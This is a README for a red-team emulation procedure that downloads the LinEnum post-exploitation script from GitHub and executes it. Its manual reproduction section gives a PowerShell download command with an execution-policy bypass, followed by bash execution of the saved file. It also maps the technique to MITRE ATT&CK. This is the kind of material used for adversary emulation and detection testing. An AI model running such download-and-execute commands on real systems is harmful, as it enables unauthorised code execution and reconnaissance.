# Download Post Exploitation Tool with Powershell

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP downloads a post exploitation tool from a given link and executes it
with Powershell.

## Arguments

- **escalate_privileges**: Whether to escalate privileges before running the
  TTP

  Default: false

- **download_link**: The link to download the post exploitation tool from

  Default: <https://raw.githubusercontent.com/rebootuser/LinEnum/65475312171107e9373dd8b06c9757610f0653d8/LinEnum.sh>

- **download_path**: The path to save the downloaded file to

  Default: ./LinEnum.sh

## Pre-requisites

1. Powershell (`pwsh`) must be installed and on the default path.

## Examples

You can run the TTP using the following example (after updating the arguments):

```bash
ttpforge run forgearmory//execution/download-post-exploitation-tool-with-powershell/download-post-exploitation-tool-with-powershell.yaml \
  --arg escalate_privileges=true
```

## Steps

1. **ensure-root-user-if-required**: This step checks if the TTP needs to be
   run as root (`escalate_privileges`) and exits with an error message if
   root access is required.
1. **download-file**: This step downloads the post exploitation tool from the
   specified link (`download_link`) using Powershell and saves it to the
   specified path (`download_path`). If the download fails, it exits with an
   error message.
1. **make-file-executable**: This step makes the downloaded file executable.
1. **execute-file**: This step executes the downloaded file.

## Manual Reproduction Steps

```bash
download_link=https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
download_path=/tmp/LinEnum.sh

pwsh -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile(\"${download_link}\",\"${download_path}\")"

# Execute it
bash "${download_path}"
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0002 Execution
- **Techniques**:
  - T1059 Command and Scripting Interpreter
- **Subtechniques**:
  - T1059.001 Command and Scripting Interpreter PowerShell
